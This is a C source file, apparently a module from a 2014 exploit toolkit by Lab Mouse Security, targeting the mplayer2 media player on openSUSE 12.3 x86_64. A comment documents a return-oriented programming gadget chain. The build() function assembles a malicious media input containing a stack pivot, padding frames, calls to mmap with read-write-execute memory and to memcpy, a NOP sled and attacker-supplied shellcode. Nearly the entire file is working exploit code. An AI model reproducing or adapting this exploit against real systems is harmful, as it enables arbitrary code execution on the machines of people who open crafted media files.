/* Copyright (C) 2014 Lab Mouse Security
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
/*
###############################################################
#
# gadget chain
#

# stack pivot chain
#
_usr_bin_mplayer2: asm=RET found at offset=235251 realistic_peer=8,4
LEAVE
JZ 0x4396f8
ADD RSP, 0x20		# required to land on talloc_header->name
POP RBX

# stack padding chain
#
_usr_bin_mplayer2: asm=RET found at offset=274660 realistic_peer=11,4
ADD RSP, 0xa0
POP RBX
POP RBP
POP R12

_usr_bin_mplayer2: asm=RET found at offset=274660 realistic_peer=11,4
ADD RSP, 0xa0
POP RBX
POP RBP
POP R12

_usr_bin_mplayer2: asm=RET found at offset=274660 realistic_peer=11,4
ADD RSP, 0xa0
POP RBX
POP RBP
POP R12

_usr_bin_mplayer2: asm=RET found at offset=274660 realistic_peer=11,4
ADD RSP, 0xa0
POP RBX
POP RBP
POP R12

# populate_mmap
#
_usr_bin_mplayer2: asm=RET found at offset=194837 realistic_peer=1,1
POP RSI			# rsi = LENGTH

_usr_bin_mplayer2: asm=RET found at offset=194358 realistic_peer=1,1
POP RDX			# rdx = 7

_usr_bin_mplayer2: asm=RET found at offset=220916 realistic_peer=1,1
POP RCX			# rcx = 0x22

_usr_bin_mplayer2: asm=RET found at offset=190953 realistic_peer=1,1
POP RAX			# populate for subsequent call

_usr_bin_mplayer2: asm=CALL RAX found at offset=285512 realistic_peer=7,3
POP R8			# r8 = 0
TEST RAX, RAX
JZ 0x445b68

_usr_bin_mplayer2: asm=RET found at offset=190953 realistic_peer=1,1
POP RAX			# consume return addr

# call mmap_anon
#
   0x0000000000547ed3 <+3>:     mov    %r8,%r9                                                                  
   0x0000000000547ed6 <+6>:     mov    $0xffffffff,%r8d                                                         
   0x0000000000547edc <+12>:    or     $0x22,%ecx                                                               
   0x0000000000547edf <+15>:    jmpq   0x429630 <mmap64@plt>                    

# populate_memcpy
#
_usr_bin_mplayer2: asm=RET found at offset=241992 realistic_peer=11,4
MOV RDX, RAX		# save copy of rax
MOV RAX, [RDX]
TEST RAX, RAX
JNZ 0x43b138

_usr_bin_mplayer2: asm=RET found at offset=190953 realistic_peer=1,1
POP RAX			# populate for subsequent call

_usr_bin_mplayer2: asm=CALL RAX found at offset=217751 realistic_peer=8,2
LEA RSI, [RSP+0x1c]
MOV RDI, RCX

_usr_bin_mplayer2: asm=CALL QWORD [RSI+0x0] found at offset=199627 realistic_peer=1,1
PUSH RDX

_usr_bin_mplayer2: asm=RET found at offset=213594 realistic_peer=10,5
ADD RSP, 0x8		# consume ret addr from call [rsi+0]
POP RBX			# save ret value from mmap64 in rbx
POP RBP			# consume ret addr from call rax
POP R12
POP R13

_usr_bin_mplayer2: asm=RET found at offset=176062 realistic_peer=9,5
POP RBP
POP R12
POP R13
POP R14
POP R15

_usr_bin_mplayer2: asm=RET found at offset=194358 realistic_peer=1,1
POP RDX			# rdx = SHELLCODE_COPY_SIZE

_usr_bin_mplayer2: asm=RET found at offset=190953 realistic_peer=1,1
POP RAX			# ensure rax = 0 for fast_memcpy

# call fast_memcpy
#
   0x0000000000543f12 <+50>:    mov    %rbx,%rdi
   0x0000000000543f15 <+53>:    test   %eax,%eax
   0x0000000000543f17 <+55>:    jne    0x5440a8 <fast_memcpy+456>
   0x0000000000543f1d <+61>:    callq  0x427950 <memcpy@plt>
   0x0000000000543f22 <+66>:    mov    %rbx,%rax
   0x0000000000543f25 <+69>:    pop    %rbx
   0x0000000000543f26 <+70>:    retq   

# call_shellcode
#
_usr_bin_mplayer2: asm=RET found at offset=296366 realistic_peer=2,1
ADD AL, 0x80

_usr_bin_mplayer2: asm=RET found at offset=56785 realistic_peer=1,1
PUSH RAX		# rax is now the unaltered dst ptr of shellcode; jmp to it

#
###############################################################
*/
#include <crush.h>

#define FRAME_BYTES (1024 + 256 + 256 + 256)

#define BASE_ADDR 0x400000ULL
#define GADGET_ADDR(o, a) ((BASE_ADDR) + (o) - (a))

#define OFFSET_TO_FRAME		0

#define FAKE_REGISTER 			0xa7a7a7a7a7a7a7a7ULL

#define STACK_PIVOT_CHAIN_G1 		GADGET_ADDR(235251, 8)

#define STACK_PADDING_G1		GADGET_ADDR(274660, 11)
#define STACK_PADDING_G1_ADJUST	24
#define STACK_PADDING_G1_SIZE		(0xa0 - STACK_PADDING_G1_ADJUST)
#define STACK_PADDING_G2		GADGET_ADDR(274660, 11)
#define STACK_PADDING_G2_SIZE		0xa0
#define STACK_PADDING_G3		GADGET_ADDR(274660, 11)
#define STACK_PADDING_G3_SIZE		0xa0
#define STACK_PADDING_G4		GADGET_ADDR(274660, 11)
#define STACK_PADDING_G4_SIZE		0xa0

#define POPULATE_MMAP_G1 		GADGET_ADDR(194837, 1)
#define POPULATE_MMAP_G2 		GADGET_ADDR(194358, 1)
#define POPULATE_MMAP_G3 		GADGET_ADDR(220916, 1)
#define POPULATE_MMAP_G4 		GADGET_ADDR(190953, 1)
#define POPULATE_MMAP_G5 		GADGET_ADDR(285512, 7)
#define POPULATE_MMAP_G6 		GADGET_ADDR(190953, 1)

#define MMAP_SIZE 8192
#define MMAP_PROT (PROT_READ|PROT_WRITE|PROT_EXEC)
#define MMAP_FLAGS (MAP_PRIVATE|MAP_ANONYMOUS)
#define MMAP_OFFSET 0

#define CALL_MMAP_ANON_G1 		0x0000000000547ed3ULL

#define POPULATE_MEMCPY_G1		GADGET_ADDR(241992, 11)
#define POPULATE_MEMCPY_G2		GADGET_ADDR(190953, 1)
#define POPULATE_MEMCPY_G3		GADGET_ADDR(217751, 8)
#define POPULATE_MEMCPY_G4		GADGET_ADDR(199627, 1)
#define POPULATE_MEMCPY_G5		GADGET_ADDR(213594, 10)
#define POPULATE_MEMCPY_G6		GADGET_ADDR(176062, 9)
#define POPULATE_MEMCPY_G7		GADGET_ADDR(194358, 1)
#define POPULATE_MEMCPY_G8		GADGET_ADDR(190953, 1)

#define MEMCPY_SHELLCODE_SIZE		/* XXX */ (512 + 256)

#define FAST_MEMCPY_G1			0x0000000000543f12ULL

#define CALL_SHELLCODE_G1		GADGET_ADDR(296366, 2)
#define CALL_SHELLCODE_G2		GADGET_ADDR(56785, 1)

#define OFFSET_TO_SHELLCODE		88

static Boolean
build(unsigned char const * input, int ninput, unsigned char ** output, int * noutput)
{
	unsigned char * buffer;
	unsigned char * p;
	unsigned char * q;
	unsigned long * l;
	int n;

	if(ninput > NSIZE)
	{       
		error(False, "payload size exceeds maximum (%d > %d)", ninput, NSIZE);
		return False;
	}

	buffer = calloc(1024, (64 * 1024));
	if(!buffer)
	{
		error(True, "memory allocation failure");
		return False;
	}

	p = buffer;

	{
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 244;

		/* increment to the start of the embedded stack frame */
		q = p;
		q += OFFSET_TO_FRAME;

		l = (unsigned long * )q;

		/* implement the stack padding for RSP adjustment */
		q = (unsigned char * )l;
		q += STACK_PADDING_G1_SIZE;
		l = (unsigned long * )q;
		*l++ = FAKE_REGISTER; /* rbx */
		*l++ = FAKE_REGISTER; /* rbp */
		*l++ = FAKE_REGISTER; /* r12 */
		*l++ = STACK_PADDING_G2;

		/* implement the stack padding for RSP adjustment */
		q = (unsigned char * )l;
		q += STACK_PADDING_G2_SIZE;
		l = (unsigned long * )q;
		*l++ = FAKE_REGISTER; /* rbx */
		*l++ = FAKE_REGISTER; /* rbp */
		*l++ = FAKE_REGISTER; /* r12 */
		*l++ = STACK_PADDING_G3;

		/* implement the stack padding for RSP adjustment */
		q = (unsigned char * )l;
		q += STACK_PADDING_G3_SIZE;
		l = (unsigned long * )q;
		*l++ = FAKE_REGISTER; /* rbx */
		*l++ = FAKE_REGISTER; /* rbp */
		*l++ = FAKE_REGISTER; /* r12 */
		*l++ = STACK_PADDING_G4;

		/* implement the stack padding for RSP adjustment */
		q = (unsigned char * )l;
		q += STACK_PADDING_G4_SIZE;
		l = (unsigned long * )q;
		*l++ = FAKE_REGISTER; /* rbx */
		*l++ = FAKE_REGISTER; /* rbp */
		*l++ = FAKE_REGISTER; /* r12 */
		*l++ = POPULATE_MMAP_G1;

		/* populate_mmap */
		*l++ = MMAP_SIZE;
		*l++ = POPULATE_MMAP_G2;
		*l++ = MMAP_PROT;
		*l++ = POPULATE_MMAP_G3;
		*l++ = MMAP_FLAGS;
		*l++ = POPULATE_MMAP_G4;
		*l++ = POPULATE_MMAP_G6;
		*l++ = POPULATE_MMAP_G5;
		*l++ = MMAP_OFFSET;
		*l++ = CALL_MMAP_ANON_G1;

		/* call mmap_anon */
		*l++ = POPULATE_MEMCPY_G1;

		/* populate memcpy */
		*l++ = POPULATE_MEMCPY_G2;
		*l++ = POPULATE_MEMCPY_G4;
		*l++ = POPULATE_MEMCPY_G3;
		*l++ = FAKE_REGISTER; /* r12 */
		*l++ = FAKE_REGISTER; /* r13 */
		*l++ = POPULATE_MEMCPY_G6;
		q = (unsigned char * )l;
		q += 4;	/* this is the base address of RSI now */
		l = (unsigned long * )q;
		*l = POPULATE_MEMCPY_G5;
		q -= 4;
		l = (unsigned long * )q;
		l++;			/* skip rbp */
		l++;			/* skip r12 */
		l++;			/* skip r13 */
		l++;			/* skip r14 */
		l++;			/* skip r15 */
		*l++ = POPULATE_MEMCPY_G7;
		*l++ = MEMCPY_SHELLCODE_SIZE;
		*l++ = POPULATE_MEMCPY_G8;
		*l++ = 0;
		*l++ = FAST_MEMCPY_G1;

		*l++ = FAKE_REGISTER;
		*l++ = CALL_SHELLCODE_G1;

		/* call shellcode */
		*l++ = CALL_SHELLCODE_G2;

		n = (char * )l - (char * )p;
		msg(MsgVerbose, "total of %d bytes encoded to the fake frame\n", n);

		n = FRAME_BYTES - n;
		p = (unsigned char * )l;

		msg(MsgVerbose, "padding a total of %d bytes with NOP\n", n);

		memset(p, 0x90, n);
		q = p;
		p += n;

		/* the rest of the shellcode payload goes here */
		q += 32;
		memcpy(q, input, ninput);

		*p++ = 32;

		p += 16843001;
		*p++ = 137; 
		*p++ = 16;
		*p++ = 0;
		*p++ = 0;

		*p++ = 62;
		p += 8;
		p += 8;
		p += 8;
		p += 8;
		p += 8;

		p -= 1; 
		l = (unsigned long * )p;
		*l++ = STACK_PIVOT_CHAIN_G1;
		*l++ = STACK_PADDING_G1;
		*l++ = 0;
		*l++ = 0xe814ec70ULL;
		*l++ = 0;
		p = (unsigned char * )l;
		p += 1;

		*p++ = 17;
		*p++ = 0;
		*p++ = 0;
	}

	*noutput = p - buffer;
	*output = buffer;

	return True;
}

Crushlet
opensuse_12_3_x86_64 =
{       
        "opensuse_12_3_x86_64",
        Platform_Linux,
        Architecture_x86_64,

        NULL,
        NULL,
        build
};

